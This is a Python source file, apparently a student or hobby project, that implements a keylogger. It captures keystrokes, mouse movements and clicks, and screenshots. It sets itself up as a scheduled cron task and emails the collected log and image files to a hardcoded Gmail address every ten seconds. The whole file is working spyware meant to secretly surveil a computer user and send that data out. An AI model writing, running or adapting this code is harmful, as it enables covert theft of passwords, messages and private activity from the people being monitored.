import logging
from threading import Thread
from pynput.keyboard import Key, Listener
from pynput import mouse
import time
import os
import PIL.ImageGrab
from TacheProgrammees import setupCron
from EnvoiMail import sendMail



#--------DÉBUT TÂCHES PROGRAMMÉES---------------
own_file=os.path.basename(__file__)
setupCron.setupCron(own_file)

#--------FIN TÂCHES PROGRAMMÉES----------------
def send():
    sendMail.send_mail(receiver_email="oussamaau123@gmail.com",
                           subject="Fichier du keylog",
                           body="Envoi du fichier keylog",
                           attachments=["keylogs.txt","screen.png", "mouse.txt"]
                       )

#--------DÉBUT PARTIE ENVOI MAIL----------------



#--------FIN PARTIE ENVOI MAIL------------------

#--------DÉBUT PARTIE RÉCOLTE SOURIS --------------

logging.basicConfig(
    filename="mouse.txt",
    filemode='w',
    datefmt='%I:%M:%S %p',
    format='%(asctime)s - %(message)s',
    level=logging.DEBUG
)
logging.debug("Mouse tracking started.")  # Message initial pour marquer le début de la traçabilité

previous_position = (0, 0)  # Initialisation de la position précédente pour le calcul de la direction


def on_mouse_move(mouse_position_x, mouse_position_y):
    global previous_position
    x_prev, y_prev = previous_position
    direction = ""

    if mouse_position_x > x_prev:
        direction += "right "
    elif mouse_position_x < x_prev:
        direction += "left "
    if mouse_position_y > y_prev:
        direction += "down"
    elif mouse_position_y < y_prev:
        direction += "up"

    previous_position = (mouse_position_x, mouse_position_y)  # Mise à jour de la position

    message = f"The mouse has moved to ({mouse_position_x}, {mouse_position_y}) - Direction: {direction.strip()}"
    print(message)
    logging.debug(message)


def on_mouse_click(mouse_position_x, mouse_position_y, button, is_pressed):
    if button == mouse.Button.middle and is_pressed:
        message = "Middle mouse button pressed! It's special!"
    else:
        message = f"Mouse button pressed: {button} | Is pressed: {is_pressed}"

    print(message)
    logging.debug(message)


#--------FIN PARTIE RÉCOLTE SOURIS ----------------

#-------- DÉBUT RÉCOLTE CAPTURE D'ÉCRAN -----------

def screen():
    screen = PIL.ImageGrab.grab()
    path = os.getcwd()
    path+="/screen.png"
    screen.save(path)

#--------- FIN RÉCOLTE CAPTURE D'ÉCRAN -----------


logging.basicConfig(filename="keylogs.txt", filemode="w",
                    datefmt='%d/%m/%Y %I:%M:%S %p', format='%(asctime)s:%(message)s', level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))



# Fonction pour exécuter `sendMail` toutes les 10 secondes dans un thread séparé
def mail_thread():
   mouse_listener = mouse.Listener(
       on_move=on_mouse_move,
       on_click=on_mouse_click,
   )
   mouse_listener.start()

   while True:
       time.sleep(10)
       screen()
       mouse_listener.stop()
       mouse_listener.join()
       send()

# L'envoi du mail se fait sur un thread séparé
Thread(target=mail_thread, daemon=True).start()


with Listener(on_press=on_press) as listener:
    listener.join()